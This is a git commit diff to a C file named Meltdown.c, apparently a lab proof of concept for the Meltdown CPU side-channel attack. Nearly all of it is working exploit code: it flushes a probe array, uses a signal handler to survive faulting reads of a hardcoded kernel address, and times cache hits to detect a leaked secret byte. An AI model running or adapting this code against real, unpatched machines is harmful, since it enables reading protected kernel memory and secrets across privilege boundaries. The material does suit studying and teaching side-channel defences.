2a483c6d3114b5af7a5e99c81b76a0391a782566
Upasana <yourgithubmail@email.com>
2019-03-18 00:24:15 +0530

    Adding module and update

--- Meltdown.c
+++ Meltdown.c
@@ -12,22 +12,20 @@
 #include <x86intrin.h>
 #include "cacheutils.h"
 
-#define CACHE_HIT_THRESHOLD 180
+#define CACHE_HIT_THRESHOLD 120
 #define MARGIN 1024
 
 int array[256*4096];
 static jmp_buf restore_point;
-static int scores[256];			// Remove later
-unsigned cycles_low, cycles_high, cycles_low1, cycles_high1;
+unsigned long count;
 
 void handle_segfault(int sig)
 {
-
- // printf("Caught signal %d\n", sig);
   signal(SIGSEGV, &handle_segfault);
   longjmp(restore_point, SIGSEGV);
 
 }
+
 void handle_segint(int sig)
 {
   printf("Caught interrupt signal %d\n", sig);
@@ -38,41 +36,11 @@ void doflush()
 {
   int i;
 
-  for (i=0; i<256; i++)
-    array[i*4096] = 1;
-  
   // FLush the array elements that could be cached
   for (i=0; i<256; i++)
   _mm_clflush(&array[i*4096]);
 }
-/*
-uint64_t rdtsc() {
-  uint64_t a, d;
-  asm volatile ("lfence");
-  asm volatile ("rdtsc" : "=a" (a), "=d" (d));
-  a = (d<<32) | a;
-  asm volatile ("lfence");
-  return a;
-}
 
-static __inline__ unsigned long long rdtsc_start()
-{
-  asm volatile("CPUID\n\t"
- "RDTSC\n\t"
- "mov %%edx, %0\n\t"
- "mov %%eax, %1\n\t": "=r" (cycles_high), "=r" (cycles_low)::
-"%rax", "%rbx", "%rcx", "%rdx");
-}
-
-static __inline__ unsigned long long rdtsc_end()
-{
-asm volatile("RDTSCP\n\t"
- "mov %%edx, %0\n\t"
- "mov %%eax, %1\n\t"
- "CPUID\n\t": "=r" (cycles_high1), "=r" (cycles_low1)::
-"%rax", "%rbx", "%rcx", "%rdx");
-}
-*/
 void reload()
 {
   int i;
@@ -84,18 +52,13 @@ void reload()
   for (i=0; i<256; i++)
   {
   addr = &array[i*4096];
-//    rdtsc_start();
-//    array[i*4096 + MARGIN] = 1;
-//    rdtsc_end();
    start = rdtsc();
    *addr = 1;
    end = rdtsc();
-//start = ( ((uint64_t)cycles_high << 32) | cycles_low );
-  //  end = ( ((uint64_t)cycles_high1 << 32) | cycles_low1 );
    if ((end - start) <= CACHE_HIT_THRESHOLD)
-  {
-        scores[i]++;
-         // printf ("Hit on element array[%d * 4096 ] \n", i);
+    {
+	if (i == 'N')    //  secret value
+ 		count++;
       }
   }
 }
@@ -109,7 +72,7 @@ asm volatile(
 
        ".rept 400;"                
 
-       "add $0x141, %%eax;"
+       "add $0x1, %%ebx;"
 
        ".endr;"                    
 
@@ -119,12 +82,10 @@ asm volatile(
 
        :
 
-       : "eax"
+       : "ebx"
 
    ); 
-//  for (i=0; i<800; i++)
-  //  a += 1;
-  
+ 
   data = *(char*)kernel_addr;  
   array[data * 4096] += 1; 
 }
@@ -141,12 +102,12 @@ int main()
     perror("open");
     return -1;
   }
-  memset(scores, 0, sizeof(scores));
   doflush();
   // Retry 1000 times on the same address.
 
   int fault_code;
-  for (i = 0; i < 1000; i++) {
+ count = 0; 
+ for (i = 0; i < 1000; i++) {
     ret = pread(fd, NULL, 0, 0); 
     if (ret < 0) {
       perror("pread");
@@ -156,23 +117,18 @@ int main()
   // Flush the probing array
   for (j = 0; j < 256; j++) 
     _mm_clflush(&array[j * 4096]);
-	fault_code = sigsetjmp(restore_point, 1);
+  
+  fault_code = sigsetjmp(restore_point, 1);
   if (fault_code == 0) 
   {
-    meltdown(0xffffffffc035e000); 
+    meltdown(0xffffffffc04e8000); 
   }
   else{
     reload();
   }
- // reload();
   }
-
-  int max = 0;
-  for (i = 0; i < 256; i++) {
-    if (scores[max] < scores[i]) max = i;
-  }
-  printf("The secret value is %d %c\n", max, max);
-  printf("The number of hits is %d\n", scores[max]);
+  
+  printf("Secret appeared %ld times \n", count);
 return 0;
 }
 
